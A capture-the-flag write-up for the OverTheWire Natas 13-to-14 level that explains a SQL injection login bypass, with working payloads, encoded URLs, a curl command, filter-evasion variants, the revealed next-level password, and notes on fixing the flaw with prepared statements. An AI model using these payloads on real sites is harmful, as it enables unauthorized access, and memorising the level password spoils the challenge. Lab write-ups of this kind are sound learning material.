# 🔐 Natas Level: Natas13--->Natas14



### 📂 Execution Process 
👉
- use this http://natas14.natas.labs.overthewire.org/?username=%22%20OR%20%221%22=%221%22%20%23&password=anything

### 📄 Password found:
👉 
SdqIqBsFcz3yotlNYErZSZwblkm0lrvx

### NOTES



1) What is happening? (Short)
- The website checks username and password using a SQL query.
- The code puts your typed username and password straight into the query without cleaning them.
- Because of that, we can give a special username that changes the query meaning. This is called SQL injection.
- If we make the WHERE part always true, the site shows "Successful login!" and prints the natas15 password.

2) Why it works (very simple)
- The code builds this:
  SELECT * from users where username="YOUR_USERNAME" and password="YOUR_PASSWORD"
- If we add a closing quote and then `OR "1"="1"`, that OR is always true.
- Then we add a comment symbol (like #) so the rest is ignored (the password check is skipped).
- Result: the WHERE becomes true and we get logged in.

3) Example payloads (use these in the `username` field)
- Plain readable:
  " OR "1"="1" #
- Another way (with double dash comment):
  " OR "1"="1" -- 
- Simpler (no inner quotes):
  " OR 1=1 #

4) How to use it in the browser (replace host with your challenge host)
- Example URL to paste in browser:
  http://natas14.natas.labs.overthewire.org/?username=%22%20OR%20%221%22=%221%22%20%23&password=anything
- If you want to see the SQL the site runs (helps learning), add debug:
  http://natas14.natas.labs.overthewire.org/?username=%22%20OR%20%221%22=%221%22%20%23&password=anything&debug=1

5) How to use curl (just copy-paste the line below, no $)
  curl 'http://natas14.natas.labs.overthewire.org/?username=%22%20OR%20%221%22=%221%22%20%23&password=anything'

6) What you will see (if it works)
- Response contains:
  Successful login! The password for natas15 is <the-password>
- Copy that password and use it for the next level.

7) If one payload is filtered or blocked, try others:
- Try removing inner quotes: %22%20OR%201=1%20%23
- Try targeting a user name: admin" #
- Try `--` instead of `#`: %22%20OR%20%221%22=%221%22%20--%20

8) Short table (helpful view)
- Goal: bypass password check
- Trick: close string, add always-true condition, comment out rest
- Comment symbols in MySQL: #  or  -- (with space after)
- Use double quotes here because the code uses double quotes around values

9) How to fix this (so websites are safe) — short notes for the coder
- Use parameterized queries / prepared statements.
- Do not build SQL by joining strings with user input.
- Example safer approach (idea): use prepared statements in PHP (mysqli_prepare) or PDO with bind_param.

10) Ethics (important)
- This is only for Natas / learning / CTF environments.
- Do not try this on real websites without permission.

11) If you want I can also:
- Make the exact curl line for the hostname you have, or
- Show the fixed PHP code example using prepared statements (easy to copy).
- Show more payloads and explain each one step-by-step.


